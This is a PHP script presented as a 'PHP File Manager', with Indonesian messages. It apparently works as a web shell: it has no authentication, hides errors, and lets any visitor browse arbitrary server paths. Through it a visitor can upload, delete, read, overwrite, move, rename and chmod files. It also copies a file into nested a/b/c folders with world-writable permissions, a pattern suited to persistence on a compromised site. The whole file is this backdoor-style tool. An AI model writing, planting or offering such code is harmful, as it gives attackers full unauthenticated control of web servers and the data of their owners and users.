<?php
error_reporting(0);
set_time_limit(0);

// Fungsi permission
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-') .
             (($perms & 0x0080) ? 'w' : '-') .
             (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : '-') .
             (($perms & 0x0020) ? 'r' : '-') .
             (($perms & 0x0010) ? 'w' : '-') .
             (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : '-') .
             (($perms & 0x0004) ? 'r' : '-') .
             (($perms & 0x0002) ? 'w' : '-') .
             (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : '-');

    return $info;
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
$back = dirname($path);

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . "/" . $_FILES['upload']['name']);
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['editfile'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
}

if (isset($_POST['copy'])) {
    $source = $_POST['copy'];
    $baseDest = rtrim($_POST['to'], '/');

    if (!is_file($source)) {
        echo "<div style='color:red;'>❌ Sumber bukan file yang valid.</div>";
    } else {
        $level1 = $baseDest . '/a';
        $level2 = $level1 . '/b';
        $level3 = $level2 . '/c';

        mkdir($level1, 0777, true);
        mkdir($level2, 0777, true);
        mkdir($level3, 0777, true);

        $filename = basename($source);

        $dest1 = $level1 . '/' . $filename;
        $dest2 = $level2 . '/' . $filename;
        $dest3 = $level3 . '/' . $filename;

        $ok1 = copy($source, $dest1);
        $ok2 = copy($source, $dest2);
        $ok3 = copy($source, $dest3);

        if ($ok1 && $ok2 && $ok3) {
            echo "<div style='color:green;'>✔️ File berhasil dicopy ke:
                <ul>
                    <li>$dest1</li>
                    <li>$dest2</li>
                    <li>$dest3</li>
                </ul>
            </div>";
        } else {
            echo "<div style='color:red;'>❌ Gagal copy ke salah satu folder.</div>";
        }
    }
}

if (isset($_POST['move'])) rename($_POST['move'], $_POST['to']);
if (isset($_POST['rename'])) rename($_POST['rename'], $_POST['newname']);
if (isset($_POST['chmod'])) chmod($_POST['chmod'], octdec($_POST['perm']));
if (isset($_POST['newfile'])) file_put_contents($path.'/'.$_POST['newfile'], '');
if (isset($_POST['newdir'])) mkdir($path.'/'.$_POST['newdir']);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f2f2f2; padding: 20px; }
        h2 { color: #444; }
        table { border-collapse: collapse; width: 100%; background: #fff; }
        th, td { padding: 8px 12px; border: 1px solid #ccc; }
        th { background: #eee; }
        a { text-decoration: none; color: #007bff; }
        a:hover { text-decoration: underline; }
        form { margin: 10px 0; background: #fff; padding: 10px; border: 1px solid #ccc; }
        input[type="text"], input[type="file"], textarea { width: 100%; padding: 6px; margin: 5px 0; }
        input[type="submit"] { padding: 6px 12px; }
    </style>
</head>
<body>

<h2>PHP File Manager</h2>
<p><strong>Current Directory:</strong> <a href="?path=<?= urlencode($back) ?>">⬅ Go Back</a> | <?= htmlspecialchars($path) ?></p>

<form method="post" enctype="multipart/form-data">
    <label>Upload File:</label>
    <input type="file" name="upload">
    <input type="submit" value="Upload">
</form>

<form method="post">
    <label>New File Name:</label>
    <input type="text" name="newfile" placeholder="newfile.txt">
    <input type="submit" value="Create File">
</form>

<form method="post">
    <label>New Directory Name:</label>
    <input type="text" name="newdir" placeholder="newfolder">
    <input type="submit" value="Create Folder">
</form>

<table>
    <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
    <?php foreach (scandir($path) as $file): if ($file === '.') continue;
        $file_path = $path . '/' . $file; ?>
    <tr>
        <td>
            <?php if (is_dir($file_path)): ?>
                <a href="?path=<?= urlencode($file_path) ?>">📁 <?= htmlspecialchars($file) ?></a>
            <?php else: ?>
                <?= htmlspecialchars($file) ?>
            <?php endif; ?>
        </td>
        <td><?= is_file($file_path) ? filesize($file_path) . " bytes" : '-' ?></td>
        <td><?= perms($file_path) ?></td>
        <td>
            <a href="?delete=<?= urlencode($file_path) ?>&path=<?= urlencode($path) ?>" onclick="return confirm('Delete?')">🗑 Delete</a>
            <?php if (is_file($file_path)): ?>
                | <a href="?edit=<?= urlencode($file_path) ?>&path=<?= urlencode($path) ?>">✏️ Edit</a>
            <?php endif; ?>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<?php if (isset($_GET['edit'])):
    $editfile = $_GET['edit']; ?>
    <h3>Editing File: <?= htmlspecialchars($editfile) ?></h3>
    <form method="post">
        <input type="hidden" name="editfile" value="<?= htmlspecialchars($editfile) ?>">
        <textarea name="content" rows="20"><?= htmlspecialchars(file_get_contents($editfile)) ?></textarea>
        <input type="submit" value="Save">
    </form>
<?php endif; ?>

<h3>File Operations</h3>

<form method="post">
    <label>Copy File (akan dicopy ke 3 subfolder: a/b/c):</label>
    <input type="text" name="copy" placeholder="/path/source.txt">
    <input type="text" name="to" placeholder="/path/tujuan">
    <input type="submit" value="Copy">
</form>

<form method="post">
    <label>Move File:</label>
    <input type="text" name="move" placeholder="/path/source">
    <input type="text" name="to" placeholder="/path/destination">
    <input type="submit" value="Move">
</form>

<form method="post">
    <label>Rename File:</label>
    <input type="text" name="rename" placeholder="/path/old">
    <input type="text" name="newname" placeholder="/path/new">
    <input type="submit" value="Rename">
</form>

<form method="post">
    <label>Change Permission (chmod):</label>
    <input type="text" name="chmod" placeholder="/path/file">
    <input type="text" name="perm" placeholder="0755">
    <input type="submit" value="CHMOD">
</form>

</body>
</html>